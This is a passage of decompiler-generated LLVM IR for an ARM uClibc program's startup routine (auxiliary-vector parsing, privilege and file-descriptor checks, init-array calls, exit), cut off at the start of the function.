  store i32 %v1_16894, i32* @r4, align 4
  store i32 %v2_16870, i32* @r5, align 4
  %v1_168b830 = inttoptr i32 %v1_16894 to i32*
  %v2_168b831 = load i32, i32* %v1_168b830, align 4
  store i32 %v2_168b831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168bc33 = icmp eq i32 %v2_168b831, 0
  store i1 %v2_168bc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168bc33, label %dec_label_pc_168c4, label %dec_label_pc_168a0

dec_label_pc_168a0:                               ; preds = %dec_label_pc_16894, %dec_label_pc_168b8
  %v4_168a8 = phi i32 [ %v1_168b4, %dec_label_pc_168b8 ], [ %v1_16894, %dec_label_pc_16894 ]
  %v5_168a4 = phi i32 [ %v2_168b8, %dec_label_pc_168b8 ], [ %v2_168b831, %dec_label_pc_16894 ]
  %v2_168a0 = icmp ugt i32 %v5_168a4, 13
  store i1 %v2_168a0, i1* %cpsr_c.global-to-local, align 1
  %v7_168a0 = icmp eq i32 %v5_168a4, 14
  store i1 %v7_168a0, i1* %cpsr_z.global-to-local, align 1
  %v2_168a4 = xor i1 %v2_168a0, true
  %v3_168a4 = or i1 %v7_168a0, %v2_168a4
  br i1 %v3_168a4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_168a0
  %v4_168a4 = load i32, i32* @r5, align 4
  %v6_168a4 = and i32 %v5_168a4, 536870912
  %v7_168a4 = icmp ne i32 %v6_168a4, 0
  store i1 %v7_168a4, i1* %cpsr_c.global-to-local, align 1
  %v8_168a4 = mul i32 %v5_168a4, 8
  %v9_168a4 = add i32 %v4_168a4, %v8_168a4
  store i32 %v9_168a4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_168a0, %bb78
  %v1_168b0 = phi i1 [ %v2_168a0, %dec_label_pc_168a0 ], [ %v7_168a4, %bb78 ]
  %v2_168a8 = xor i1 %v1_168b0, true
  %v3_168a8 = or i1 %v7_168a0, %v2_168a8
  br i1 %v3_168a8, label %bb80, label %dec_label_pc_168b8

bb80:                                             ; preds = %bb79
  store i32 %v4_168a8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_168b8

dec_label_pc_168b8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_168a8, i32 ptrtoint (i32* @global_var_13680.963 to i32))
  %v0_168b4 = load i32, i32* @r4, align 4
  %v1_168b4 = add i32 %v0_168b4, 8
  store i32 %v1_168b4, i32* @r4, align 4
  %v1_168b8 = inttoptr i32 %v1_168b4 to i32*
  %v2_168b8 = load i32, i32* %v1_168b8, align 4
  store i32 %v2_168b8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168bc = icmp eq i32 %v2_168b8, 0
  store i1 %v2_168bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168bc, label %dec_label_pc_168c4, label %dec_label_pc_168a0

dec_label_pc_168c4:                               ; preds = %dec_label_pc_168b8, %dec_label_pc_16894
  store i32 %v2_16870, i32* %r0.global-to-local, align 4
  %v1_168c8 = call i32 @_dl_aux_init(i32 %v2_16870)
  store i32 %v1_168c8, i32* %r0.global-to-local, align 4
  %v1_168cc = call i32 @__GI___uClibc_init(i32 %v1_168c8)
  store i32 %v1_168cc, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_168d4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_168d4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_168dc = add i32 %v2_168d4, 148
  %v3_168dc = inttoptr i32 %v2_168dc to i32*
  %v4_168dc = load i32, i32* %v3_168dc, align 4
  store i32 %v4_168dc, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168e4 = icmp eq i32 %tmp66, 0
  store i1 %v2_168e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168e4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_168c4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_168c4, %bb81
  %v0_168f0 = phi i32 [ %tmp66, %dec_label_pc_168c4 ], [ 4096, %bb81 ]
  %v3_168ec = icmp eq i32 %tmp65, -1
  store i1 %v3_168ec, i1* %cpsr_c.global-to-local, align 1
  %v8_168ec = icmp eq i32 %tmp65, -1
  store i1 %v8_168ec, i1* %cpsr_z.global-to-local, align 1
  %v2_168f0 = inttoptr i32 %v4_168dc to i32*
  store i32 %v0_168f0, i32* %v2_168f0, align 4
  br i1 %v3_168ec, label %dec_label_pc_168f8, label %dec_label_pc_16920

dec_label_pc_168f8:                               ; preds = %bb82
  %v0_168f8 = call i32 @getuid()
  store i32 %v0_168f8, i32* @r0, align 4
  store i32 %v0_168f8, i32* %r4.global-to-local, align 4
  %v0_16900 = call i32 @geteuid()
  store i32 %v0_16900, i32* @r0, align 4
  %v3_16904 = icmp uge i32 %v0_168f8, %v0_16900
  store i1 %v3_16904, i1* %cpsr_c.global-to-local, align 1
  %v9_16904 = icmp eq i32 %v0_168f8, %v0_16900
  store i1 %v9_16904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16904, label %dec_label_pc_1690c, label %dec_label_pc_16948

dec_label_pc_1690c:                               ; preds = %dec_label_pc_168f8
  %v1_1690c = call i32 @getgid(i32 %v0_16900)
  store i32 %v1_1690c, i32* @r0, align 4
  store i32 %v1_1690c, i32* %r4.global-to-local, align 4
  %v0_16914 = call i32 @getegid()
  store i32 %v0_16914, i32* %r0.global-to-local, align 4
  %v3_16918 = icmp uge i32 %v1_1690c, %v0_16914
  store i1 %v3_16918, i1* %cpsr_c.global-to-local, align 1
  %v9_16918 = icmp eq i32 %v1_1690c, %v0_16914
  store i1 %v9_16918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16918, label %dec_label_pc_16920, label %dec_label_pc_16948

dec_label_pc_16920:                               ; preds = %dec_label_pc_1690c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_168ec, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_168ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_168ec, label %dec_label_pc_16970, label %dec_label_pc_1692c

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16920
  store i32 %tmp64, i32* @r3, align 4
  %v3_16930 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_16930, i1* %cpsr_c.global-to-local, align 1
  %v9_16930 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_16930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16930, label %dec_label_pc_16938, label %dec_label_pc_16948

dec_label_pc_16938:                               ; preds = %dec_label_pc_1692c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_16940 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_16940, i1* %cpsr_c.global-to-local, align 1
  %v9_16940 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_16940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16940, label %dec_label_pc_16970, label %dec_label_pc_16948

dec_label_pc_16948:                               ; preds = %dec_label_pc_1692c, %dec_label_pc_1690c, %dec_label_pc_168f8, %dec_label_pc_16938
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_16954 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1695c = load i32, i32* @r4, align 4
  store i32 %v0_1695c, i32* %r1.global-to-local, align 4
  %v2_16960 = call i32 @__check_one_fd(i32 1, i32 %v0_1695c)
  %v0_16964 = load i32, i32* @r4, align 4
  store i32 %v0_16964, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1696c = call i32 @__check_one_fd(i32 2, i32 %v0_16964)
  store i32 %v2_1696c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16970

dec_label_pc_16970:                               ; preds = %dec_label_pc_16938, %dec_label_pc_16920, %dec_label_pc_16948
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_16978 = load i32, i32* %arg3, align 4
  store i32 %v2_16978, i32* %r2.global-to-local, align 4
  %v2_1697c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1697c, i32* %r1.global-to-local, align 4
  %v3_16980 = add i32 %v2_1697c, 260
  %v4_16980 = inttoptr i32 %v3_16980 to i32*
  store i32 %v2_16978, i32* %v4_16980, align 4
  %v0_16984 = load i32, i32* %r0.global-to-local, align 4
  %v1_16984 = inttoptr i32 %v0_16984 to i32*
  %v2_16984 = load i32, i32* %v1_16984, align 4
  store i32 %v2_16984, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16988 = icmp eq i32 %v2_16984, 0
  store i1 %v2_16988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16988, label %bb84, label %dec_label_pc_16990

dec_label_pc_16990:                               ; preds = %dec_label_pc_16970
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_16994 = load i32, i32* %r1.global-to-local, align 4
  %v2_16994 = add i32 %v0_16994, 164
  %v3_16994 = inttoptr i32 %v2_16994 to i32*
  %v4_16994 = load i32, i32* %v3_16994, align 4
  store i32 %v4_16994, i32* %r3.global-to-local, align 4
  %v2_16998 = inttoptr i32 %v4_16994 to i32*
  store i32 %v2_16984, i32* %v2_16998, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_169a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_169a0 = inttoptr i32 %v0_169a0 to i32*
  %v2_169a0 = load i32, i32* %v1_169a0, align 4
  store i32 %v2_169a0, i32* %r0.global-to-local, align 4
  %v4_169a4 = call i32 @__GI_strrchr(i32 %v2_169a0, i32 47, i32 %v2_16978, i32 %v4_16994)
  store i32 %v4_169a4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_169ac = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_169ac, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169b0 = icmp eq i32 %v4_169a4, 0
  store i1 %v2_169b0, i1* %cpsr_z.global-to-local, align 1
  %v2_169b4 = add i32 %v2_169ac, 96
  %v3_169b4 = inttoptr i32 %v2_169b4 to i32*
  %v4_169b4 = load i32, i32* %v3_169b4, align 4
  store i32 %v4_169b4, i32* %r2.global-to-local, align 4
  br i1 %v2_169b0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_16990
  %v2_169bc58 = inttoptr i32 %v4_169b4 to i32*
  store i32 0, i32* %v2_169bc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_16990
  %v2_169b8 = add i32 %v4_169a4, 1
  store i32 %v2_169b8, i32* %r3.global-to-local, align 4
  %v2_169bc = inttoptr i32 %v4_169b4 to i32*
  store i32 %v4_169a4, i32* %v2_169bc, align 4
  %v1_169c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_169c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_169c0 = inttoptr i32 %v2_169c0 to i32*
  store i32 %v1_169c0, i32* %v3_169c0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_16970
  %v2_169d0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_169d0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_169dc = add i32 %v2_169d0, -12
  store i32 %v2_169dc, i32* %r5.global-to-local, align 4
  store i32 2008, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_169ec = add i32 %v2_169d0, 2008
  %v4_169ec = inttoptr i32 %v3_169ec to i32*
  store i32 %arg5, i32* %v4_169ec, align 4
  %v0_16a0418 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a0419 = load i32, i32* %r7.global-to-local, align 4
  %v3_16a0421 = icmp uge i32 %v0_16a0418, %v1_16a0419
  store i1 %v3_16a0421, i1* %cpsr_c.global-to-local, align 1
  %v9_16a0427 = icmp eq i32 %v0_16a0418, %v1_16a0419
  store i1 %v9_16a0427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a0421, label %dec_label_pc_16a38.lr.ph, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %bb84, %dec_label_pc_169f4
  %v1_169f4 = phi i32 [ %v1_16a00, %dec_label_pc_169f4 ], [ %v0_16a0418, %bb84 ]
  %v0_169f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_169f4 = and i32 %v1_169f4, 1073741824
  %v3_169f4 = icmp ne i32 %v2_169f4, 0
  store i1 %v3_169f4, i1* %cpsr_c.global-to-local, align 1
  %v4_169f4 = mul i32 %v1_169f4, 4
  %v5_169f4 = add i32 %v4_169f4, %v0_169f4
  %v6_169f4 = inttoptr i32 %v5_169f4 to i32*
  %v7_169f4 = load i32, i32* %v6_169f4, align 4
  store i32 %v7_169f4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_169f4)
  %v0_16a00 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a00 = add i32 %v0_16a00, 1
  store i32 %v1_16a00, i32* %r4.global-to-local, align 4
  %v1_16a04 = load i32, i32* %r7.global-to-local, align 4
  %v3_16a04 = icmp uge i32 %v1_16a00, %v1_16a04
  store i1 %v3_16a04, i1* %cpsr_c.global-to-local, align 1
  %v9_16a04 = icmp eq i32 %v1_16a00, %v1_16a04
  store i1 %v9_16a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a04, label %dec_label_pc_16a38.lr.ph, label %dec_label_pc_169f4

dec_label_pc_16a38.lr.ph:                         ; preds = %dec_label_pc_169f4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a0c = icmp eq i32 %v0_16858, 0
  store i1 %v2_16a0c, i1* %cpsr_z.global-to-local, align 1
  %v2_16a14 = xor i1 %v2_16a0c, true
  call void @__pseudo_cond_branch(i1 %v2_16a14, i32 %v0_16858)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_16a20 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_16a2c = add i32 %v2_16a20, -12
  store i32 %v2_16a2c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a38

dec_label_pc_16a38:                               ; preds = %dec_label_pc_16a38.dec_label_pc_16a38_crit_edge, %dec_label_pc_16a38.lr.ph
  %v1_16a38 = phi i32 [ %v1_16a44, %dec_label_pc_16a38.dec_label_pc_16a38_crit_edge ], [ 0, %dec_label_pc_16a38.lr.ph ]
  %v0_16a38 = phi i32 [ %v0_16a38.pre, %dec_label_pc_16a38.dec_label_pc_16a38_crit_edge ], [ %v2_16a2c, %dec_label_pc_16a38.lr.ph ]
  %v2_16a38 = and i32 %v1_16a38, 1073741824
  %v3_16a38 = icmp ne i32 %v2_16a38, 0
  store i1 %v3_16a38, i1* %cpsr_c.global-to-local, align 1
  %v4_16a38 = mul i32 %v1_16a38, 4
  %v5_16a38 = add i32 %v4_16a38, %v0_16a38
  %v6_16a38 = inttoptr i32 %v5_16a38 to i32*
  %v7_16a38 = load i32, i32* %v6_16a38, align 4
  store i32 %v7_16a38, i32* %ip.global-to-local, align 4
  store i32 92740, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_16a38)
  %v0_16a44 = load i32, i32* @r4, align 4
  %v1_16a44 = add i32 %v0_16a44, 1
  store i32 %v1_16a44, i32* @r4, align 4
  %v1_16a48 = load i32, i32* @r7, align 4
  %v3_16a48 = icmp uge i32 %v1_16a44, %v1_16a48
  store i1 %v3_16a48, i1* %cpsr_c.global-to-local, align 1
  %v9_16a48 = icmp eq i32 %v1_16a44, %v1_16a48
  store i1 %v9_16a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a48, label %dec_label_pc_16a50, label %dec_label_pc_16a38.dec_label_pc_16a38_crit_edge

dec_label_pc_16a38.dec_label_pc_16a38_crit_edge:  ; preds = %dec_label_pc_16a38
  %v0_16a38.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16a38

dec_label_pc_16a50:                               ; preds = %dec_label_pc_16a38
  %v2_16a54.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16a54.pre, i32* %r0.global-to-local, align 4
  %v2_16a58 = add i32 %v2_16a54.pre, -69116
  store i32 %v2_16a58, i32* %r2.global-to-local, align 4
  store i32 %v2_16a58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a60 = icmp eq i32 %v2_16a58, 0
  store i1 %v2_16a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a60, label %dec_label_pc_16a78, label %dec_label_pc_16a68

dec_label_pc_16a68:                               ; preds = %dec_label_pc_16a50
  store i32 92784, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_16a58)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16a74 = load i32, i32* %r0.global-to-local, align 4
  %v2_16a74 = inttoptr i32 %v1_16a74 to i32*
  store i32 0, i32* %v2_16a74, align 4
  %v2_16a7c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_16a78

dec_label_pc_16a78:                               ; preds = %dec_label_pc_16a50, %dec_label_pc_16a68
  %v2_16a7c = phi i32 [ %v2_16a54.pre, %dec_label_pc_16a50 ], [ %v2_16a7c.pre, %dec_label_pc_16a68 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_16a7c, i32* %r1.global-to-local, align 4
  %v2_16a80 = add i32 %v2_16a7c, 128
  %v3_16a80 = inttoptr i32 %v2_16a80 to i32*
  %v4_16a80 = load i32, i32* %v3_16a80, align 4
  store i32 %v4_16a80, i32* %r2.global-to-local, align 4
  store i32 %v4_16a80, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a88 = icmp eq i32 %v4_16a80, 0
  store i1 %v2_16a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a88, label %dec_label_pc_16aa0, label %dec_label_pc_16a90

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a78
  store i32 92824, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16a80)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16a9c = load i32, i32* %r0.global-to-local, align 4
  %v2_16a9c = inttoptr i32 %v1_16a9c to i32*
  store i32 0, i32* %v2_16a9c, align 4
  br label %dec_label_pc_16aa0

dec_label_pc_16aa0:                               ; preds = %dec_label_pc_16a78, %dec_label_pc_16a90
  %v2_16aa0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_16aa0, i32* @r0, align 4
  %v1_16aa4 = call i32 @_setjmp(i32 %v2_16aa0)
  store i32 %v1_16aa4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16aa8 = icmp eq i32 %v1_16aa4, 0
  store i1 %v2_16aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16aa8, label %dec_label_pc_16ab0, label %dec_label_pc_16afc

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16aa0
  %v0_16ab0 = call i32 @__aeabi_read_tp()
  store i32 %v0_16ab0, i32* %r0.global-to-local, align 4
  %v1_16ab4 = add i32 %v0_16ab0, -1168
  store i32 %v1_16ab4, i32* %r2.global-to-local, align 4
  %v2_16abc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16abc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_16ac8 = add i32 %v2_16abc, 56
  %v3_16ac8 = inttoptr i32 %v2_16ac8 to i32*
  %v4_16ac8 = load i32, i32* %v3_16ac8, align 4
  store i32 %v4_16ac8, i32* %ip.global-to-local, align 4
  store i32 %v2_16aa0, i32* %r3.global-to-local, align 4
  %v2_16ad8 = add i32 %v0_16ab0, -1040
  %v3_16ad8 = inttoptr i32 %v2_16ad8 to i32*
  store i32 %v2_16aa0, i32* %v3_16ad8, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_16ae4 = load i32, i32* %ip.global-to-local, align 4
  %v1_16ae4 = inttoptr i32 %v0_16ae4 to i32*
  %v2_16ae4 = load i32, i32* %v1_16ae4, align 4
  store i32 %v2_16ae4, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_16af4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b98

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16aa0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_16b00 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16b00, i32* %ip.global-to-local, align 4
  %v2_16b04 = add i32 %v2_16b00, 40
  %v3_16b04 = inttoptr i32 %v2_16b04 to i32*
  %v4_16b04 = load i32, i32* %v3_16b04, align 4
  store i32 %v4_16b04, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16b04)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_16b14 = load i32, i32* %stack_var_-416, align 4
  %v2_16b18 = add i32 %v2_16b14, 120
  %v3_16b18 = inttoptr i32 %v2_16b18 to i32*
  %v4_16b18 = load i32, i32* %v3_16b18, align 4
  store i32 %v4_16b18, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16b50.dec_label_pc_16b1c_crit_edge, %dec_label_pc_16afc
  %v0_16b1c = phi i32 [ %v0_16b1c.pre, %dec_label_pc_16b50.dec_label_pc_16b1c_crit_edge ], [ %v4_16b18, %dec_label_pc_16afc ]
  %v1_16b1c = inttoptr i32 %v0_16b1c to i32*
  %v2_16b1c = load i32, i32* %v1_16b1c, align 4
  store i32 %v0_16b1c, i32* %r2.global-to-local, align 4
  store i32 %v2_16b1c, i32* %r4.global-to-local, align 4
  %v1_16b28 = add i32 %v2_16b1c, -1
  store i32 %v1_16b28, i32* %r1.global-to-local, align 4
  %v2_16b2c89 = load i32, i32* %v1_16b1c, align 4
  store i32 %v2_16b2c89, i32* %r3.global-to-local, align 4
  %v3_16b3091 = icmp uge i32 %v2_16b2c89, %v2_16b1c
  store i1 %v3_16b3091, i1* %cpsr_c.global-to-local, align 1
  %v9_16b3097 = icmp eq i32 %v2_16b2c89, %v2_16b1c
  store i1 %v9_16b3097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b3097, label %dec_label_pc_16b38, label %dec_label_pc_16b50

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16b1c, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge
  %v0_16b3898 = phi i32 [ %v1_16b30.pre, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge ], [ %v2_16b1c, %dec_label_pc_16b1c ]
  store i32 %v0_16b3898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b48, label %dec_label_pc_16b4c, label %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge

dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge:  ; preds = %dec_label_pc_16b38
  %v0_16b2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b30.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16b2c = inttoptr i32 %v0_16b2c.pre to i32*
  %v2_16b2c = load i32, i32* %v1_16b2c, align 4
  store i32 %v2_16b2c, i32* %r3.global-to-local, align 4
  %v3_16b30 = icmp uge i32 %v2_16b2c, %v1_16b30.pre
  store i1 %v3_16b30, i1* %cpsr_c.global-to-local, align 1
  %v9_16b30 = icmp eq i32 %v2_16b2c, %v1_16b30.pre
  store i1 %v9_16b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b30, label %dec_label_pc_16b38, label %dec_label_pc_16b50

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16b38
  %v0_16b4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b50

dec_label_pc_16b50:                               ; preds = %dec_label_pc_16b1c, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge, %dec_label_pc_16b4c
  %v0_16b58 = phi i32 [ %v0_16b4c, %dec_label_pc_16b4c ], [ %v2_16b2c89, %dec_label_pc_16b1c ], [ %v2_16b2c, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge ]
  %v1_16b50 = phi i32 [ %v0_16b4c, %dec_label_pc_16b4c ], [ %v2_16b1c, %dec_label_pc_16b1c ], [ %v1_16b30.pre, %dec_label_pc_16b38.dec_label_pc_16b2c_crit_edge ]
  %v3_16b50 = icmp uge i32 %v0_16b58, %v1_16b50
  store i1 %v3_16b50, i1* %cpsr_c.global-to-local, align 1
  %v9_16b50 = icmp eq i32 %v0_16b58, %v1_16b50
  store i1 %v9_16b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b50, label %dec_label_pc_16b58, label %dec_label_pc_16b50.dec_label_pc_16b1c_crit_edge

dec_label_pc_16b50.dec_label_pc_16b1c_crit_edge:  ; preds = %dec_label_pc_16b50
  %v0_16b1c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b1c

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b50
  %v2_16b58 = icmp ne i32 %v1_16b50, 0
  store i1 %v2_16b58, i1* %cpsr_c.global-to-local, align 1
  %v7_16b58 = icmp eq i32 %v1_16b50, 1
  store i1 %v7_16b58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b58, label %dec_label_pc_16b98, label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16b58
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16b98

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16b58, %dec_label_pc_16b60, %dec_label_pc_16ab0
  %storemerge2 = phi i32 [ %v0_16af4, %dec_label_pc_16ab0 ], [ 0, %dec_label_pc_16b60 ], [ 0, %dec_label_pc_16b58 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_16b9c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_16b9c, i32* %r0.global-to-local, align 4
  %v0_16ba0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16ba0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_16b98
  %v2_16ba0 = load i32, i32* %r4.global-to-local, align 4
  %v2_16ba4 = load i32, i32* @r8, align 4
  %v8_16ba4 = shl i32 %v2_16ba4, %v1_16b9c
  %v9_16ba4 = and i32 %v8_16ba4, %v1_16b9c
  %v8_16ba8 = lshr i32 %v2_16ba4, %v9_16ba4
  %v9_16ba8 = and i32 %v8_16ba8, %v9_16ba4
  %v2_16bac = inttoptr i32 %v9_16ba8 to i64*
  %v3_16bac = load i64, i64* %v2_16bac, align 4
  %v4_16bac = load i32, i32* %ip.global-to-local, align 4
  %v5_16bac = trunc i64 %v3_16bac to i32
  %v6_16bac = udiv i64 %v3_16bac, 4294967296
  %v7_16bac = trunc i64 %v6_16bac to i32
  store i32 %v5_16bac, i32* %r1.global-to-local, align 4
  %v9_16bac = sub i32 %v7_16bac, %v4_16bac
  %v3_16bb0 = mul i32 %v9_16bac, %v2_16ba0
  %v5_16bb8 = mul i32 %v2_16ba0, 4
  %v5_16bbc = udiv i32 %v2_16ba0, 2
  %v6_16bb8 = and i32 %v5_16bbc, %v5_16bb8
  %v6_16bbc = and i32 %v6_16bb8, %v3_16bb0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_16bbc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16b98, %bb85
  %v5_16bc0 = phi i32 [ %v1_16b9c, %dec_label_pc_16b98 ], [ %v6_16bbc, %bb85 ]
  ret i32 %v5_16bc0

; uselistorder directives
  uselistorder i32 %v2_16ba0, { 1, 0, 2 }
  uselistorder i32 %v1_16b9c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_16b50, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16b4c, { 1, 0, 2 }
  uselistorder i32 %v1_16b30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16b1c, { 1, 0 }
  uselistorder i32 %v2_16a7c, { 1, 0 }
  uselistorder i32 %v2_16a54.pre, { 2, 0, 1 }
  uselistorder i32 %v1_16a48, { 1, 0 }
  uselistorder i32 %v1_16a44, { 3, 2, 1, 0 }
